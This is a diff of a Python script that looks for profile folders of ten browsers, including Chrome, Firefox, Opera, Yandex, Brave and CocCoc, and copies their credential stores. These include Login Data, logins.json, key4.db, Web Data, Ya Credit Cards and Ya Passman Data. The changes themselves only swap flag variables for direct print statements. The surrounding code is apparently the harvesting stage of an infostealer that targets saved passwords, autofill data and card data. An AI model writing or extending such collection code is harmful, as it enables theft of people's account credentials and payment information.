@@ -147,14 +147,10 @@ try:
 					find("History", src, "\\Google Chrome\\")
 					find("Login Data", src, "\\Google Chrome\\")
 					find("Web Data", src, "\\Google Chrome\\")
-					gccopy = True
+					print(" 	{+} Google Chrome")
 				except OSError:
-					gccopy = True
-
-
-			if gccopy == True:
-				print(" 	{+} Google Chrome")
-
+					print(" 	{+} Google Chrome")
+				
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
 				src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\".format(user)
@@ -167,12 +163,10 @@ try:
 					find("History", src, "\\Opera GX\\")
 					find("Login Data", src, "\\Opera GX\\")
 					find("Web Data", src, "\\Opera GX\\")
-					ogxcopy = True
+					print(" 	{+} Opera GX")
 				except OSError:
-					ogxcopy = True
+					print(" 	{+} Opera GX")
 
-			if ogxcopy == True:
-				print(" 	{+} Opera GX")
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
 				src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(user)
@@ -185,12 +179,9 @@ try:
 					find("History", src, "\\Opera\\")
 					find("Login Data", src, "\\Opera\\")
 					find("Web Data", src, "\\Opera\\")
-					ocopy = True
+					print(" 	{+} Opera")
 				except OSError:
-					ocopy = True
-
-			if ocopy == True:
-				print(" 	{+} Opera")
+					print(" 	{+} Opera")		
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
@@ -204,12 +195,9 @@ try:
 					find("key4.db", src, "\\Firefox\\")
 					find("logins.json", src, "\\Firefox\\")
 					find("formhistory.sqlite", src, "\\Firefox\\")
-					fcopy = True
+					print(" 	{+} Firefox")
 				except OSError:
-					fcopy = True
-
-			if fcopy == True:
-				print(" 	{+} Firefox")
+					print(" 	{+} Firefox")
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
@@ -226,12 +214,9 @@ try:
 					find("Ya Autofill Data", src, "\\Yandex\\")
 					find("Ya Credit Cards", src, "\\Yandex\\")
 					find("Ya Passman Data", src, "\\Yandex\\")
-					ycopy = True
+					print(" 	{+} Yandex")
 				except OSError:
-					ycopy = True
-
-			if ycopy == True:
-				print(" 	{+} Yandex")
+					print(" 	{+} Yandex")
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
@@ -245,13 +230,10 @@ try:
 					find("History", src, "\\Vivaldi\\")
 					find("Web Data", src, "\\Vivaldi\\")
 					find("Login Data", src, "\\Vivaldi\\")
-					vcopy = True
+					print(" 	{+} Vivaldi")
 				except OSError:
-					vcopy = True
-
-			if vcopy == True:
-				print(" 	{+} Vivaldi")
-
+					print(" 	{+} Vivaldi")
+				
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
 				src = "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)
@@ -264,13 +246,10 @@ try:
 					find("History", src, "\\Brave\\")
 					find("Login Data", src, "\\Brave\\")
 					find("Web Data", src, "\\Brave\\")
-					bcopy = True
+					print(" 	{+} Brave")
 				except OSError:
-					bcopy = True
-
-
-			if bcopy == True:
-				print(" 	{+} Brave")
+					print(" 	{+} Brave")
+				
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
 				src = "C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)
@@ -283,13 +262,10 @@ try:
 					find("History", src, "\\Chrome Canary\\")
 					find("Login Data", src, "\\Chrome Canary\\")
 					find("Web Data", src, "\\Chrome Canary\\")
-					cccopy = True
+					print(" 	{+} Chrome Canary")
 				except OSError:
-					cccopy = True
+					print(" 	{+} Chrome Canary")
 
-
-			if cccopy == True:
-				print(" 	{+} Chrome Canary")
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
 				src = "C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)
@@ -302,14 +278,10 @@ try:
 					find("History", src, "\\Chromium\\")
 					find("Login Data", src, "\\Chromium\\")
 					find("Web Data", src, "\\Chromium\\")
-					ccopy = True
+					print(" 	{+} Chromium")
 				except OSError:
-					ccopy = True
+					print(" 	{+} Chromium")
 					
-
-			if ccopy == True:
-				print(" 	{+} Chromium")
-
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
 				src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
@@ -322,13 +294,11 @@ try:
 					find("History", src, "\\CocCoc\\")
 					find("Login Data", src, "\\CocCoc\\")
 					find("Web Data", src, "\\CocCoc\\")
-					coccopy = True
+					print(" 	{+} CocCoc")
 				except OSError:
-					coccopy = True
-					
-
-			if coccopy == True:
-				print(" 	{+} CocCoc")
+					print(" 	{+} CocCoc")
+			
+				
 		browsers()
 
 		print(")")
